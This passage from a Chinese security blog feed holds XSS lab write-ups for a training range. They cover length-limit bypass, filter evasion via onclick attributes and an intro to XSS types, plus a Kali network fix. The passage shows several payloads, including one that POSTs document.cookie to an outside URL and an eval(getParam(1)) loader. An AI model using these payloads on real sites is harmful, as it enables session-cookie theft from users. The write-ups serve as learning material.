alt></p><ul><li>接着我们，打开控制台，找出记录在源码中的位置，看看能不能直接触发XSS，顺便看看会不会有过滤</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(6).png" alt></p><ul><li>从上图我们可以看到，记录原原本本地出现在了标签之中，尝试<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(7).png" alt="被过滤掉了"></p><ul><li>但是很遗憾，<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>都被过滤掉了</li><li>分析代码，发现标签的内容也是我们可以控制的，所以我们可以尝试构造onclick事件</li><li>闭合log字段，构造payload：”onclick=”alert(1)”</li><li>添加到记录后我们查看源代码，成功地构造了一个onclick事件</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard.png" alt></p><ul><li>点击有onclick事件的记录，成功弹窗</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(15).png" alt></p><br></li><li><p>但是跨站脚本的目的肯定不是弹窗对吧</p></li><li><p>所以我们来构造个更有趣的payload</p></li><li><pre class=" language-javascript"><code class="language-javascript">$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>url<span class="token punctuation">:</span><span class="token string">'https://tofu.exeye.run/limit_check'</span><span class="token punctuation">,</span>        type<span class="token punctuation">:</span><span class="token string">'post'</span><span class="token punctuation">,</span>        data<span class="token punctuation">:</span><span class="token punctuation">{</span>cookie<span class="token punctuation">:</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">}</span><span class="token punctuation">,</span>        success<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">alert</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">}</span>       <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li><li><p>这段代码可以向指定的URL发送POST请求，并且附上点击者的cookie，然后success字段的函数会把响应的内容以弹窗的形式反馈给我们</p></li><li><p>但是这段代码需要用eval执行，所以最终的payload为</p></li><li><pre class=" language-javascript"><code class="language-javascript"><span class="token string">"onclick="</span><span class="token function">eval</span><span class="token punctuation">(</span>$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>url<span class="token punctuation">:</span><span class="token string">'https://tofu.exeye.run/limit_check'</span><span class="token punctuation">,</span>type<span class="token punctuation">:</span><span class="token string">'post'</span><span class="token punctuation">,</span>data<span class="token punctuation">:</span><span class="token punctuation">{</span>cookie<span class="token punctuation">:</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">}</span><span class="token punctuation">,</span>success<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">alert</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>"</code></pre></li><li><p>上面说了，搜索框的限制为33字符，那么我们该怎么使用这么长的payload呢</p></li></ul><br><ul><li><p>接下来我们试试第一种方法</p><ul><li>在javascripts中<strong>location.href.substr(x)</strong>可获取浏览器地址栏中第x个字符以后的文本    </li><li>比如<strong>location.href.substr(66)</strong>，就是获取url中第<strong>66</strong>个字符以后的文本</li><li>不信的同学可以尝试到控制台去运行下，然后在地址栏中数数</li></ul></li><li><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(12).png" alt="URL"></p></li><li><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(4).png" alt="控制台console界面"></p><ul><li>所以我们可以尝试先将payload输入到地址栏中，因为地址栏是不会限制字符数的，输入后先在console测试多少个字符开始后是我们的payload</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(11).png" alt></p><ul><li>然后再构造另一部分payload：”onclick=”eval(location.href.substr(35))”</li><li>但是很遗憾这段payload的长度是44个字符，还是超过了33</li><li>那么只能找找网页本身的js代码，寻找是否有开发者写入的网页本身的调用参数的简单语句了</li></ul></li></ul><br><ul><li><p>第二种方法：</p><ul><li><p>控制记录输出的部分js代码</p></li><li><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">let</span> query <span class="token operator">=</span>  <span class="token function">getParam</span><span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">''</span>             <span class="token comment" spellcheck="true">//从location.search中获取query参数的值</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">{</span>            query<span class="token operator">=</span>query<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;|>|script/g</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//33字符限制</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>query<span class="token operator">!=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        record<span class="token punctuation">.</span>record_list<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span><span class="token punctuation">{</span>search<span class="token punctuation">:</span> query<span class="token punctuation">,</span> time<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLocaleString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'searchInfo'</span><span class="token punctuation">,</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>record<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.search-ipt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>record <span class="token operator">&amp;&amp;</span> record<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token string">''</span>            record<span class="token punctuation">.</span>record_list<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>i <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                str <span class="token operator">+</span><span class="token operator">=</span> <span class="token string">'&lt;h4>&lt;a class="cd-nowrap"  log="'</span><span class="token operator">+</span>i<span class="token punctuation">.</span>search<span class="token operator">+</span><span class="token string">':content">'</span><span class="token operator">+</span>i<span class="token punctuation">.</span>search<span class="token operator">+</span><span class="token string">'&lt;/a>&lt;/h4>&lt;time datetime="2016-01-12">'</span><span class="token operator">+</span>i<span class="token punctuation">.</span>time<span class="token operator">+</span><span class="token string">'&lt;/time>'</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.record-box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">function</span> <span class="token function">getParam</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token operator">!=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token comment" spellcheck="true">//如果location.search不为空</span>        <span class="token keyword">let</span> param <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//创建个新的对象,值为所有的参数</span>        <span class="token keyword">return</span> <span class="token function">decodeURI</span><span class="token punctuation">(</span>param<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>               <span class="token comment" spellcheck="true">//param从参数name中取出value，然后解码</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">''</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li><p>通过分析上述代码，我们发现函数getParam()可以取出地址栏中对应参数的值</p></li><li><p>所以我们可以构造这样一个payload：<code>&quot;onclick=&quot;eval(getParam(1))&quot;</code></p></li><li><p>接着在后面用&amp;附上参数1的值，也就是我们真正能发挥作用的payload</p></li><li><p>我们先让参数1的值为alert(‘XSS’)，不过这里已经经过URL编码</p></li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(3).png" alt></p><ul><li>然后在console中调用下函数，可以看到参数1确实被赋值了</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(14).png" alt></p><ul><li>点击记录，也能触发弹窗</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(13).png" alt></p><ul><li>接着我们就可以将参数1换成真正的payload拿到正确flag了</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(15).png" alt></p><ul><li>这里最后验证下，通过抓包可以看到，我们确实将自己的cookie发送过去了</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(17).png" alt></p><ul><li>假如你发送过去的cookie值不对，那么会提示输入正确的cookie，也无法弹出正确的flag了</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(16).png" alt="提示请传入正确的cookie参数，我的burp不能显示中文所以乱码了"></p><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(5).png" alt></p><ul><li>正确的flag</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(9).png" alt></p></li></ul><br><ul><li><p>知识拓展：</p><ul><li><strong>location.search</strong>：地址栏中?后所有的参数值（包括问号）</li></ul><p><img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(10).png" alt></p><ul><li><p>js中location.href.substr(x)可获取浏览器地址栏中第x个字符以后的文本</p><ul><li>比如location.href.substr(66)，就是获取地址栏中第66个字符以后的文本</li></ul></li><li><p>什么是<strong>AJAX</strong></p><ul><li><p>AJAX = 异步 JavaScript 和 XML（Asynchronous JavaScript and XML）。简短地说，在不重载整个网页的情况下，AJAX 通过后台加载数据，并在网页上进行显示。</p></li><li><p>我们的恶意代码就是通过异步的方式，在后台对指定URL发起POST请求，然后根据响应内容弹窗</p></li><li><pre class=" language-javascript"><code class="language-javascript">$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>url<span class="token punctuation">:</span><span class="token string">'https://tofu.exeye.run/limit_check'</span><span class="token punctuation">,</span>        type<span class="token punctuation">:</span><span class="token string">'post'</span><span class="token punctuation">,</span>        data<span class="token punctuation">:</span><span class="token punctuation">{</span>cookie<span class="token punctuation">:</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">}</span><span class="token punctuation">,</span>        success<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">alert</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">}</span>       <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（四）跨站脚本XSS之逃逸过滤</title>
      <link href="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/"/>
      <url>/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/</url>
      
        <content type="html"><![CDATA[<ul><li>当我们学会了打破网页结构之后，我们发现这个技巧有些情况并不适用。并不能成功的闭合标签，或者像<code>&lt;script&gt;</code>标签直接被过滤。这时候我们应该换一个思路,使用事件属性来突破。</li><li>靶场由<a href="https://zhishihezi.net/box/" target="_blank" rel="noopener">知识盒子</a>提供，本篇靶场地址：<a href="https://tofu.exeye.run/event" target="_blank" rel="noopener">https://tofu.exeye.run/event</a></li></ul><br><ul><li>直接打开页面是一个输入框，右边的按钮会将输入的内容变成一个链接</li></ul><p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(2).png" alt></p><ul><li><p>按套路走，先看javascript的源代码，因为输入内容一般会先由js控制</p></li><li><pre class=" language-javascript"><code class="language-javascript"> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.url-btn'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">//定义按钮类url-btn的函数内容</span>            <span class="token keyword">let</span> val <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.search-ipt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//获取输入框的内容</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                   <span class="token comment" spellcheck="true">//如果为空</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.url-box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">,</span> <span class="token string">'none'</span><span class="token punctuation">)</span>               <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//如果不为空</span>                val <span class="token operator">=</span>  val<span class="token punctuation">.</span><span class="token function">toLocaleLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/script/g</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;/g</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/>/g</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//这里会过滤掉&lt;>和script</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.url-box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">,</span> <span class="token string">'block'</span><span class="token punctuation">)</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.url-box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">'&lt;span style="padding-left: 2px">生成的链接为：&lt;a class="url" href="'</span><span class="token operator">+</span>val<span class="token operator">+</span><span class="token string">'">'</span><span class="token operator">+</span>val<span class="token operator">+</span><span class="token string">'&lt;/a>&lt;/span>'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//将输入的内容变成href的value</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">)</span></code></pre></li><li><p>分析源代码，我们输入的数据会变成链接，以及标签的内容，但是<code>&lt;script&gt;</code>会被过滤</p></li><li><p>如果只是过滤script这个字眼，那这里有个小技巧，可以在一个script中再插入个script，比如scrscriptipt，系统将script过滤掉后刚好面的字母又可以组成一个script</p></li><li><p>但是偏偏还过滤了&lt;&gt;，所以这就有点难办了，无法打破网页结构</p></li></ul><p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(3).png" alt></p><ul><li><p>分析源码，我们发现还有个方法，就是构造一个onclick事件让他触发js代码</p></li><li><p>那么怎么触发呢？</p></li><li><p>我们同样需要先闭合href字段，再给末尾的引号凑对</p></li><li><p>所以我们的最终payload为：</p></li><li><pre class=" language-javascript"><code class="language-javascript"><span class="token string">"onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span></code></pre></li></ul><p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(4).png" alt="这样就成功构造了一个onclick事件"></p><ul><li>点击链接成功触发弹窗</li></ul><p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(1).png" alt></p><ul><li>不过有个需要注意到的地方就是payload括号中不能用双引号，否则就不能凑成一个闭合，也就无法触发弹窗了</li></ul><p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决新版Kali桥接和NAT无法共存的问题</title>
      <link href="/2020/07/22/%E8%A7%A3%E5%86%B3%E6%96%B0%E7%89%88Kali%E6%A1%A5%E6%8E%A5%E5%92%8CNAT%E6%97%A0%E6%B3%95%E5%85%B1%E5%AD%98%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2020/07/22/%E8%A7%A3%E5%86%B3%E6%96%B0%E7%89%88Kali%E6%A1%A5%E6%8E%A5%E5%92%8CNAT%E6%97%A0%E6%B3%95%E5%85%B1%E5%AD%98%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<ul><li>最近在安装了配备XFCE桌面的新版KALI后，突然发现添加的一张桥接的网卡，不能和NAT网卡同时使用，两张网卡只允许一张获取IP地址</li></ul><p><img src="/2020/07/22/%E8%A7%A3%E5%86%B3%E6%96%B0%E7%89%88Kali%E6%A1%A5%E6%8E%A5%E5%92%8CNAT%E6%97%A0%E6%B3%95%E5%85%B1%E5%AD%98%E7%9A%84%E9%97%AE%E9%A2%98/clipboard.png" alt></p><ul><li>后来发现，可能是虚拟机添加了这张网卡，但是KALI本身没有办法启用它。</li><li>于是我找到了高级网络编辑器，发现里面确实只有一个以太网连接，两张网卡只能选择一个</li></ul><p><img src="/2020/07/22/%E8%A7%A3%E5%86%B3%E6%96%B0%E7%89%88Kali%E6%A1%A5%E6%8E%A5%E5%92%8CNAT%E6%97%A0%E6%B3%95%E5%85%B1%E5%AD%98%E7%9A%84%E9%97%AE%E9%A2%98/clipboard(7).png" alt></p><ul><li>添加新的以太网连接驱动桥接的网卡</li></ul><p><img src="/2020/07/22/%E8%A7%A3%E5%86%B3%E6%96%B0%E7%89%88Kali%E6%A1%A5%E6%8E%A5%E5%92%8CNAT%E6%97%A0%E6%B3%95%E5%85%B1%E5%AD%98%E7%9A%84%E9%97%AE%E9%A2%98/clipboard(6).png" alt></p><ul><li>添加成功后</li></ul><p><img src="/2020/07/22/%E8%A7%A3%E5%86%B3%E6%96%B0%E7%89%88Kali%E6%A1%A5%E6%8E%A5%E5%92%8CNAT%E6%97%A0%E6%B3%95%E5%85%B1%E5%AD%98%E7%9A%84%E9%97%AE%E9%A2%98/clipboard(4).png" alt></p><ul><li>成功让两张网卡获取IP地址</li></ul><p><img src="/2020/07/22/%E8%A7%A3%E5%86%B3%E6%96%B0%E7%89%88Kali%E6%A1%A5%E6%8E%A5%E5%92%8CNAT%E6%97%A0%E6%B3%95%E5%85%B1%E5%AD%98%E7%9A%84%E9%97%AE%E9%A2%98/clipboard(5).png" alt></p><ul><li>另外如果没法生效，建议重启下网络服务</li></ul><pre><code>systemctl  restart  networking/etc/init.d/networking restart</code></pre><ul><li>然后在右上角的网络设置里看看有没有连接上，因为两张网卡都需要以太网连接</li></ul><p><img src="/2020/07/22/%E8%A7%A3%E5%86%B3%E6%96%B0%E7%89%88Kali%E6%A1%A5%E6%8E%A5%E5%92%8CNAT%E6%97%A0%E6%B3%95%E5%85%B1%E5%AD%98%E7%9A%84%E9%97%AE%E9%A2%98/clipboard(2).png" alt></p><ul><li>以太网连接1是NAT的</li></ul><p><img src="/2020/07/22/%E8%A7%A3%E5%86%B3%E6%96%B0%E7%89%88Kali%E6%A1%A5%E6%8E%A5%E5%92%8CNAT%E6%97%A0%E6%B3%95%E5%85%B1%E5%AD%98%E7%9A%84%E9%97%AE%E9%A2%98/clipboard(3).png" alt></p><ul><li>以太网连接2是桥接的</li></ul><p><img src="/2020/07/22/%E8%A7%A3%E5%86%B3%E6%96%B0%E7%89%88Kali%E6%A1%A5%E6%8E%A5%E5%92%8CNAT%E6%97%A0%E6%B3%95%E5%85%B1%E5%AD%98%E7%9A%84%E9%97%AE%E9%A2%98/clipboard(1).png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KALI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（一）跨站脚本XSS之基本反射型</title>
      <link href="/2020/07/19/%EF%BC%88%E4%B8%80%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8F%8D%E5%B0%84%E5%9E%8B/"/>
      <url>/2020/07/19/%EF%BC%88%E4%B8%80%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8F%8D%E5%B0%84%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h5 id="什么是XSS？"><a href="#什么是XSS？" class="headerlink" title="什么是XSS？"></a>什么是XSS？</h5><p>&emsp;通常指黑客通过“HTML 注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。在一开始，这种攻击的演示案例是跨域的，所以叫做“跨站脚本”。但是发展到今天，由于JavaScript的强大功能以及网站前端应用的复杂化，是否跨域已经不再重要。但是由于历史原因，XSS这个名字却一直保留下来。</p><h5 id="XSS根据效果可分为以下几类："><a href="#XSS根据效果可分为以下几类：" class="headerlink" title="XSS根据效果可分为以下几类："></a>XSS根据效果可分为以下几类：</h5><ul><li><strong>反射型：(Non-persistent xsS)</strong>：反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。反射型 XSS 也叫做“非持久型XSS。</li><li><strong>存储式XSS</strong>：黑客把恶意的脚本保存到服务器端，所以这种XSS攻击就叫做“存储型XSS”。<ul><li>比较常见的一个场景就是，黑客写下一篇包含有恶意JavaScript代码的博客文章，文章发存储型XSS会把用户输入的数据“存储”在服务器端。这种XSS具有很强的稳定性。表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。</li><li>存储型XSS通常也叫做“持久型XSS”(Persistent XSS)，因为从效果上来说，它存在的时间是比较长的。</li></ul></li><li><strong>基于DOM的XSS</strong>：实际上，这种类型的XSS并非按照“数据是否保存在服务器端”来划分DOM Based xSS从效果上来说也是反射型XSS。单独划分出来，是因为DOM Based XSS的形成原因比较特别，发现它的安全专家专门提出了这种类型的XSS。出于历史原因，也就把它单独作为一个分类了。通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</li></ul><h5 id="用一个例子说明下反射型"><a href="#用一个例子说明下反射型" class="headerlink" title="用一个例子说明下反射型"></a>用一个例子说明下反射型</h5><p>&emsp;我们需要用到一个靶场，靶场由<a href="https://zhishihezi.net/box/" target="_blank" rel="noopener">知识盒子</a>提供，这个靶场主要是localstorage的问题，因为现在很多网站的搜索栏为了方便我们，有了一个历史搜索记录保存我们之前搜索过的东西。而这个记录一般会保存到localstorage中，如果开发者没有做好过滤等保护措施，这个地方就可能会存在xss。靶场地址：<a href="https://tofu.exeye.run/local" target="_blank" rel="noopener">https://tofu.exeye.run/local</a></p><ul><li><p>打开页面，只有一个输入框和搜索按钮</p><p><img src="/2020/07/19/%EF%BC%88%E4%B8%80%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8F%8D%E5%B0%84%E5%9E%8B/clipboard(6).png" alt></p></li><li><p>随便输入123，刷新页面后发现会有历史搜索记录</p><p><img src="/2020/07/19/%EF%BC%88%E4%B8%80%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E5%9F%BA%E6%9C%AC%E5%8F%8D%E5%B0%84%E5%9E%8B/clipboard(2).png" alt></p></li><li><p>打开控制台，查看javascript代码</p></li><li><pre class=" language-javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.search-ipt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">,</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> val<span class="token operator">=</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'record'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">''</span>           <span class="token comment" 